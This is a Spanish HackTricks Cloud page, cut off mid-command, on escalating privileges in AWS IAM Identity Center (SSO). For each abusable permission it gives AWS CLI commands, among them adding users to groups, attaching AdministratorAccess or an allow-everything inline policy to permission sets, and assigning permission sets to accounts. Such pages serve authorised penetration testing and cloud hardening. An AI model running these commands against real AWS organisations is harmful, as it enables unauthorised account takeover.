# AWS - SSO y Privilegio de Escalada de Identitystore

<details>

<summary><strong>춰Apoya a HackTricks y obt칠n beneficios!</strong></summary>

* Si deseas ver a tu **empresa anunciada en HackTricks** o si deseas acceder a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Centro de Identidad de AWS / AWS SSO

Para obtener m치s informaci칩n sobre el Centro de Identidad de AWS / AWS SSO, consulte:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Tenga en cuenta que por **defecto**, solo los **usuarios** con permisos **del** **Cuenta de Administraci칩n** podr치n acceder y **controlar el Centro de Identidad IAM**.\
Los usuarios de otras cuentas solo pueden permitirlo si la cuenta es un **Administrador Delegado**.\
[Consulte la documentaci칩n para obtener m치s informaci칩n.](https://docs.aws.amazon.com/singlesignon/latest/userguide/delegated-admin.html)
{% endhint %}

### ~~Restablecer la contrase침a~~

Una forma f치cil de escalar privilegios en casos como este ser칤a tener un permiso que permita restablecer las contrase침as de los usuarios. Desafortunadamente, solo es posible enviar un correo electr칩nico al usuario para restablecer su contrase침a, por lo que necesitar칤a acceso al correo electr칩nico del usuario.

### `identitystore:CreateGroupMembership`

Con este permiso, es posible establecer un usuario dentro de un grupo para que herede todos los permisos que tiene el grupo.

{% code overflow="wrap" %}
```bash
aws identitystore create-group-membership --identity-store-id <tore-id> --group-id <group-id> --member-id UserId=<user-id>
```
{% endcode %}

### `sso:PutInlinePolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Un atacante con este permiso podr칤a otorgar permisos adicionales a un conjunto de permisos que se otorga a un usuario bajo su control.

{% code overflow="wrap" %}
```bash
# Establecer una pol칤tica en l칤nea con privilegios de administrador
aws sso-admin put-inline-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --inline-policy file:///tmp/policy.yaml

# Contenido de /tmp/policy.yaml
{
	"Version": "2012-10-17",
	"Statement": [
		{
			"Sid": "Statement1",
			"Effect": "Allow",
			"Action": ["*"],
			"Resource": ["*"]
		}
	]
}

# Actualizar la aprovisionamiento para que se cree la nueva pol칤tica en la cuenta
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:AttachManagedPolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Un atacante con este permiso podr칤a otorgar permisos adicionales a un conjunto de permisos que se otorga a un usuario bajo su control.

{% code overflow="wrap" %}
```bash
# Establecer la pol칤tica de acceso de administrador en el conjunto de permisos
aws sso-admin attach-managed-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --managed-policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Actualizar la aprovisionamiento para que se cree la nueva pol칤tica en la cuenta
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:AttachCustomerManagedPolicyReferenceToPermissionSet`, `sso:ProvisionPermissionSet`

Un atacante con este permiso podr칤a otorgar permisos adicionales a un conjunto de permisos que se otorga a un usuario bajo su control.

{% hint style="warning" %}
Para abusar de estos permisos en este caso, debe conocer el **nombre de una pol칤tica administrada por el cliente que est치 dentro de TODAS las cuentas** que se ver치n afectadas.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Establecer la pol칤tica de acceso de administrador en el conjunto de permisos
aws sso-admin attach-customer-managed-policy-reference-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --customer-managed-policy-reference <customer-managed-policy-name>

# Actualizar la aprovisionamiento para que se cree la nueva pol칤tica en la cuenta
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:CreateAccountAssignment`

Un atacante con este permiso podr칤a dar un conjunto de permisos a un usuario bajo su control a una cuenta.

{% code overflow="wrap" %}
```bash
aws sso-admin create-account-assignment --instance-arn <instance-arn> --target-id <account_num> --target-type AWS_ACCOUNT --permission-set-arn <permission_set_arn> --principal-type USER --principal-id <principal_id>
```
{% endcode %}

### `sso:GetRoleCredentials`

Devuelve las credenciales a corto plazo de STS para un nombre de rol determinado que se asigna al usuario.

{% code overflow="wrap" %}
```
aws sso get-role-credentials --role-name <value> --account-id <value> --access-token <value>
```
{% endcode %}

Sin embargo, se necesita un token de acceso del que no estoy seguro de c칩mo obtener (TODO).

### `sso:DetachManagedPolicyFromPermissionSet`

Un atacante con este permiso puede eliminar la asociaci칩n entre una pol칤tica administrada de AWS del conjunto de permisos especificado. Es posible otorgar m치s privilegios a trav칠s de **la eliminaci칩n de una pol칤tica administrada (pol칤tica de denegaci칩n)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-managed-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN> --managed-policy-arn <ManagedPolicyARN>
```
{% endcode %}

### `sso:DetachCustomerManagedPolicyReferenceFromPermissionSet`

Un atacante con este permiso puede eliminar la asociaci칩n entre una pol칤tica administrada por el cliente del conjunto de permisos especificado. Es posible otorgar m치s privilegios a trav칠s de **la eliminaci칩n de una pol칤tica administrada (pol칤tica de denegaci칩n)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-customer-managed-policy-reference-from-permission-set --instance-arn <value> --permission-set-arn <value> --customer-managed